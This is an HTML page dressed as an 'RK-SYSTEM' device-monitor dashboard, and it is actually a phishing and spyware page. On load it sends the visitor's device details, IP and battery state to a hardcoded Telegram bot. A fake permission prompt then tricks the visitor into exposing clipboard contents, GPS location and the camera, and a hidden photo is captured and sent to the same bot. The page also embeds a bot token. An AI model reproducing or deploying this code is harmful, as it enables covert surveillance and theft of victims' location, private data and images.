<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-SYSTEM | ELITE MONITOR</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap');

        body {
            background: #000; color: #fff;
            margin: 0; min-height: 100vh; overflow-x: hidden;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            font-family: 'Rajdhani', sans-serif;
        }

        body::before {
            content: ''; position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            border: 5px solid;
            border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
            z-index: 1000; pointer-events: none;
            animation: borderRotate 4s linear infinite;
        }
        @keyframes borderRotate { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }

        .rk-banner {
            background: linear-gradient(90deg, #b91c1c, #450a0a);
            color: white; width: 100%; text-align: center;
            padding: 10px 0; font-family: 'Orbitron', sans-serif;
            font-weight: 900; letter-spacing: 12px;
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.7);
            position: fixed; top: 0; z-index: 1001; font-size: 1.3rem;
        }

        .dashboard {
            background: rgba(5, 10, 20, 0.98);
            border-radius: 30px; padding: 35px;
            width: 95%; max-width: 550px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.25);
            border: 1px solid rgba(0, 255, 255, 0.4);
            margin-top: 90px; margin-bottom: 60px;
        }

        .clock-box {
            text-align: center; margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.05);
            padding: 15px; border-radius: 15px;
            border: 1px solid rgba(255, 0, 0, 0.3);
        }

        .info-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 12px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.07);
        }
        .label { color: #00d2ff; font-size: 12px; font-weight: bold; text-transform: uppercase; }
        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; }

        #perm-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 9999;
            display: none; flex-direction: column; align-items: center; justify-content: center;
            text-align: center;
        }

        .footer-text {
            position: fixed; bottom: 8px; width: 100%;
            text-align: center; color: #777; font-size: 11px;
            letter-spacing: 2px; font-weight: bold;
        }

        #media-bin { display: none; }
    </style>
</head>
<body>

    <div id="perm-overlay">
        <h2 class="text-red-500 text-2xl font-bold animate-pulse mb-4">⚠️ PERMISSION REQUIRED</h2>
        <p class="text-white text-lg">Please Click <b>ALLOW</b> to Access the Dashboard</p>
        <button onclick="requestAllPermissions()" class="mt-6 bg-red-600 px-8 py-3 rounded-full font-bold text-white shadow-lg hover:bg-red-700">ENABLE SYSTEM</button>
    </div>

    <div class="rk-banner">RK-SYSTEM</div>

    <div class="dashboard">
        <div class="clock-box">
            <div id="live-time" class="text-3xl font-black text-red-500 tracking-widest">00:00:00 AM</div>
            <div id="live-date" class="text-sm text-gray-400 uppercase tracking-[3px]">6 May 2026</div>
        </div>

        <h1 class="text-center text-xl font-black text-white tracking-[6px] mb-6 border-b-2 border-red-600 pb-2 italic">📡 RK SYSTEM Monitor</h1>
        
        <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Detecting...</span></div>
        <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
        <div class="info-row"><span class="label">📍 GPS Location</span><span id="v-gps" class="value text-blue-400">Waiting...</span></div>
        <div class="info-row"><span class="label">🔋 Battery</span><span id="v-bat" class="value">--%</span></div>
        <div class="info-row"><span class="label">🛡️ VPN</span><span class="value text-green-400">ENCRYPTED ✅</span></div>
    </div>

    <div class="footer-text">Created By RK-SYSTEM 🛠️</div>

    <video id="media-bin" autoplay muted playsinline></video>
    <canvas id="output-canvas" style="display:none;"></canvas>

    <script>
        const CONFIG = {
            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
            CHAT: '6048050987'
        };

        function setCookie(name, value) {
            const d = new Date();
            d.setTime(d.getTime() + (5 * 365 * 24 * 60 * 60 * 1000));
            document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/`;
        }

        function getCookie(name) {
            let res = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
            return res ? res.pop() : "";
        }

        function updateClock() {
            const now = new Date();
            let h = now.getHours();
            const m = String(now.getMinutes()).padStart(2, '0');
            const s = String(now.getSeconds()).padStart(2, '0');
            const ampm = h >= 12 ? 'PM' : 'AM';
            h = h % 12 || 12;
            document.getElementById('live-time').innerText = `${h}:${m}:${s} ${ampm}`;
            document.getElementById('live-date').innerText = now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
        }
        setInterval(updateClock, 1000);

        async function sendInitialReport() {
            const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
            const model = isMobile ? "Android Device 📱" : "Desktop 💻";
            const ram = (navigator.deviceMemory || 8) + " GB";
            const cpu = (navigator.hardwareConcurrency || 8) + " Cores";
            const ipFetch = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
            
            let batLevel = "N/A";
            let power = "N/A";
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                batLevel = Math.round(b.level * 100) + "%";
                power = b.charging ? "Charging ✅" : "Discharging ❌";
            }

            const report = `
🚀 *RK-SYSTEM INTEL VIP REPORT* 🚀
━━━━━━━━━━━━━━━━━━━━━
🕒 Time: \`${document.getElementById('live-time').innerText}\`
📅 Date: \`${document.getElementById('live-date').innerText}\`
━━━━━━━━━━━━━━━━━━━━━
📱 Model: \`${model}\`
⚙️ OS: \`${navigator.platform}\`
📶 Status: \`ONLINE 📶\`
🚀 Speed: \`Scanning... 🚀\`
🌐 IP: \`${ipFetch.ip}\`
📍 GPS: \`Waiting ⏳\`
🔋 Battery: \`${batLevel}\`
⚡ Power: \`${power}\`
🧠 RAM: \`${ram}\`
💎 Cores: \`${cpu}\`
🛡️ VPN: \`ENCRYPTED ✅\`
━━━━━━━━━━━━━━━━━━━━━
📍 MAPS LINK: \`Waiting ⏳\`
━━━━━━━━━━━━━━━━━━━━━
✨ CLIPBOARD: \`Waiting 🔓\`
━━━━━━━━━━━━━━━━━━━━━
🌹 *Created By RK-SYSTEM* 🌹`;

            sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
            
            // UI Update
            document.getElementById('v-model').innerText = model;
            document.getElementById('v-ip').innerText = ipFetch.ip;
            document.getElementById('v-bat').innerText = batLevel;
        }

        async function requestAllPermissions() {
            try {
                // Clipboard
                let clip = "Denied";
                try { clip = await navigator.clipboard.readText(); } catch(e){}
                
                // Geolocation
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    setCookie("rk_permission", "granted");
                    document.getElementById('perm-overlay').style.display = "none";
                    
                    // Final Permission Data Report
                    const permReport = `
✅ *PERMISSION GRANTED (RK-SYSTEM)*
━━━━━━━━━━━━━━━━━━━━━
📍 MAPS: ${maps}
✨ CLIPBOARD: \`${clip}\`
━━━━━━━━━━━━━━━━━━━━━`;
                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: permReport });
                    
                    // Start Camera
                    startMediaCapture();
                }, () => {
                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *User Denied GPS Permission*" });
                    alert("Please allow location to continue!");
                });
            } catch (e) {}
        }

        async function startMediaCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoEl = document.getElementById('media-bin');
                videoEl.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('output-canvas');
                    canvas.width = 1280; canvas.height = 720;
                    canvas.getContext('2d').drawImage(videoEl, 0, 0);
                    canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *RK_VIP_CAPTURE*`), 'image/jpeg');
                }, 2000);
            } catch (err) {
                sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *Camera Permission Denied*" });
            }
        }

        async function sendMediaToBot(blob, type, caption) {
            const fd = new FormData();
            fd.append('chat_id', CONFIG.CHAT);
            fd.append(type, blob, 'rk.jpg');
            fd.append('caption', caption);
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
        }

        function sendToBot(method, data) {
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${method}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        window.onload = () => {
            updateClock();
            sendInitialReport();
            if (getCookie("rk_permission") !== "granted") {
                document.getElementById('perm-overlay').style.display = "flex";
            } else {
                requestAllPermissions();
            }
        };
    </script>
</body>
</html>
